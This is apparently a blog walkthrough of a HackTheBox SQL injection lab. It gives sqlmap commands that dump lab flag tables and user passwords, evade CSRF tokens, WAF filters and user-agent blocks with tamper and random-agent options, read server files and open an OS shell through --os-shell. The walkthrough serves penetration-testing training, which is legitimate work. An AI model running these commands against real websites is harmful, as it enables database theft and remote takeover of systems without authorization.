---
title: "SQLmap Essentials - HackTheBox"
date: 2025-01-07 00:00:00 +0300
categories: [SQLmap Essentials]
tags: [SQLmap Essentials, cheatsheet, HackTheBox]
---


# SQLmap Essentials 

Hello there, welcome to my first blog of the year. 

This lab series is part of the [Bug Bounty Hunter Path](https://academy.hackthebox.com/path/preview/bug-bounty-hunter) of HackTheBox. This module aims to teach you the basics of using SQLMap to discover various types of SQL Injection vulnerabilities, all the way to the advanced enumeration of databases to retrieve all data of interest.

While I wait for the final skill assessment payload to get the flag which is taking a little too long I decided to write this walkthrough. It is among the labs I enjoyed much during the Bug Bounty Path.

I hope you enjoy perusing this walkthrough as much as I did writing it.


# Running SQLmap on a HTTP Request

We are provided with a target that leads to a page that displays links to the different Cases respective of the questions.
 
 ![Alt Text](../assets/img/SQLMap-Essentials/sqlmap-essentials1.png)



Questions:


1. `What's the contents of table flag2? (Case #2)`

There is an 'id' parameter that is used to retrive rows of a table from a database. 

This indicates it is a POST request. This might help us in writing the command.

    sqlmap  'http://SERVERIP:PORT/case2.php' --data='id=*1' --batch --dump -T flag2
    


From the command:


`--data - speecifies that the HTTP data provided should be sent in a POST request.`

`id=*1 - This is the parameter of interest. The asterisk is a custom injection marker.`
  
`--batch - allows the running of the command without any user input.`

`--dump - displays data from a specified database table`

`-T - specifies database table.`



2. `What's the contents of table flag3? (Case #3)`

The cookie value id is vulnerable.

    sqlmap 'http://SERVERIP:PORT/case3.php'  --cookie='id=1*' --batch --dump  -T flag3


From the command:

  `--cookie - specifies the HTTP cookies that should be sent with the POST requests.`



3. `What's the contents of table flag4? (Case #4) `

There is a vulnerability in a JSON value for data: id. 

While JSON data is parsed differently in a HTTP request we may use a tool like BURP or Curl to capture the raw HTTP request and output it to a file. We then use the file in the command.

We will use Burpsuite for this.

![Alt Text](../assets/img/SQLMap-Essentials/sqlmap-essentials2.png)


    sqlmap -r req.txt  --batch --dump  -T flag4 

While it is applicable in this lab, we may also use the following command.

    sqlmap -u 'http://SERVERIP:PORT/case4.php'  --data={'"id":1'} --batch --dump  -T flag4

    

# Attack Tuning

Sqlmap comes right off the bat as a very strong tool, though it is capable to do more with some tuning by using flags that increase the accuracy of your scan. These may include flags for Level/Risk, Status Codes, Text and Techniques etc.

In this section we will use some of the above-mentioned flags that will dig deeper in our scans to achieve our goals. Follow me as we do it.

Questions

1. `What's the contents of table flag5? (Case #5) `

This challenges indicaes an OR SQLi vulnerability for the parameter 'id'. For this we will have to use the Level/Risk flags by raising the risk level. This is done because OR payloads are inherently dangerous in a default run, where underlying vulnerable SQL statements are actively modifying the database content. 

    sqlmap -u http://SERVERIP:PORT/case5.php?id=1 -T flag5 --no-cast --dump --batch --risk 3 --level 5

    sqlmap -u http://SERVERIP:PORT/case5.php?id=1 -T flag5 --no-cast --dump --batch --risk 3 --level 5 -dbs testdb -dbms MYSQL


From the command:

  `--no-cast - This flag ensures that you get the correct content.` 
  
  `--risk - [1-3]  extends the risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).`
  
  `--level - [1-5] extends  boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).`
  
  `--dbs - The database in question.`
  
  `--dbms - The underlying Database schema being used.`



2. `What's the contents of table flag6? (Case #6)`

The challenge has a vulnerable parameter col. This challenge requires the use of the prefix flag.

    sqlmap -u 'http://SERVERIP:PORT/case6.php?col=id' -T flag6 --dump --batch --risk 3 --level 5 --prefix='`)'

From the command:

  `--prefix -  used to specify a prefix that will be added to the payloads sent by SQLmap during its testing process`

  

3. `What's the contents of table flag7? (Case #7)`

The challenge has a vulnerable parameter at id and it is vulnerable using a UNION Query based technique. This means that we have to use the Union flag.

    sqlmap -u 'http://SERVERIP:PORT/case7.php?id=1' -T flag7 --dump --batch --risk 3 --level 5 --union-col=5

From the Command:

  `--union-col=5 - From the provided exercise we can manually count the columns in the table, so we include that in the command`

  

# Database Enumeration

Database enumaration requires the knowledge of how to use flags in your command. The `man sqlmap` and `sqlmap --help` can be of help with this.

Questions

1. `What's the contents of table flag1 in the testdb database? (Case #1)`

This challenge requires to know the names of the Database containing the table in question and the Database schema type being used

    sqlmap -u 'http://SERVERIP:PORT/case1.php?id=1' -T flag1 --dump --batch --risk 3 --level 5 --dbms MYSQL -D testdb
    


# Advanced Database Enumeration

Question

1. `What's the name of the column containing "style" in it's name? (Case #1)`

After looking into the sqlmap manual page we should now know what flag to use in order to get contents of the 'style' column

    sqlmap -u 'http://SERVERIP:PORT/case1.php?id=1' --batch --search -C "style"

From the command: 

  `search -C - Used to search for databases, tables, and columns of interest. The -C flag represents columns.`

  

2. `What's the Kimberly user's password? (Case #1)`

        sqlmap -u 'http://SERVERIP:PORT/case1.php?id=1' --dump --batch --columns -C name,password -T users

 From the command:

  `column - Lists the columns specified`

  

# Bypassing Web Application Protections

Questions

1. ` What's the contents of table flag8? (Case #8) `
   
This challenge indicates the need for a token. So we open up BurpSuite and capture the token or we can use the web dev tools for that.
We capture the request using Burp and we now have our token 


 ![Alt Text](../assets/img/SQLMap-Essentials/sqlmap-essentials3.png)
 

We save the request to a file to be later used in our command. The website  is providing us with our own cookie it is best we keep it simple and use the original Burpsuite request rather than sqlmap providing us with another different cookie that would mess up the command request.

Notice the name of the token provided,`t0ken`, we should not mistake this while writingour command.

    sqlmap -r reqs.txt -p 'id' --csrf-token="t0ken" --batch -T flag8 --dump --no-cast
    

2.`What's the contents of table flag9? (Case #9)`

This challenge contains a unique ID so we will use the `--randomize` flag to work around that. 

      sqlmap -u 'http://SERVERIP:PORT/case9.php?id=1&uid=51434972' --batch -T flag9 --dump --no-cast --randomize='uid'
      

3.` What's the contents of table flag10? (Case #10)`

The challenge seems to ignore any http request sent through sqlmap. So bypass this we will use a random agent.

    sqlmap -r reqs.txt -p 'id' --batch --dump -T flag10 --random-agent --no-cast


4.`What's the contents of table flag11? (Case #11) `

This challenge requires the filtering of certain characters. To do this we use the `--tamper` flag.

    sqlmap -u  'http://SERVERIP:PORT/case11.php?id=1' --batch --dump -T flag11 --no-cast --tamper=between 

From this command:

`--tamper=between - Replaces greater than operator (>) with NOT BETWEEN 0 AND # and equals operator (=) with BETWEEN # AND #`



# OS Exploration

SQLMap has the ability to utilize an SQL Injection to read and write files from the local system outside the DBMS. SQLMap can also attempt to give us direct command execution on the remote host if we had the proper privileges.

Questions

1.`Try to use SQLMap to read the file "/var/www/html/flag.txt".`

We first check if we can read the Database
          
    sqlmap -u 'http://SERVERIP:PORT/?id=1' --is-dba --batch

The output returns `True` which means we can read and write in the Database.

      sqlmap -u 'http://SERVERIP:PORT/?id=1'  -p 'id' --batch --file-read="/var/www/html/flag.txt"

2.`Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.`

      sqlmap -u 'http://SERVERIP:PORT/?id=1'  -p 'id' --batch --os-shell



# Skills Assesment

Questions

1.`What's the contents of table final_flag? `

When we visit the page provided we see this

![Alt Text](../assets/img/SQLMap-Essentials/sqlmap-essentials4.png)

After navigating all pages and links in the website we find a POST Request for an interesting page 

![Alt Text](../assets/img/SQLMap-Essentials/sqlmap-essentials5.png)

So we try and find any payloads to find the final flag

    sqlmap -r reqs.txt -p 'id' --batch --dump -T final_flag --random-agent --no-cast --tamper=between

It takes a while to find the final flag but we have it!




Thank you for taking time to read this, Follow me on my socials provided and join the RSS feed for more updates. 





    









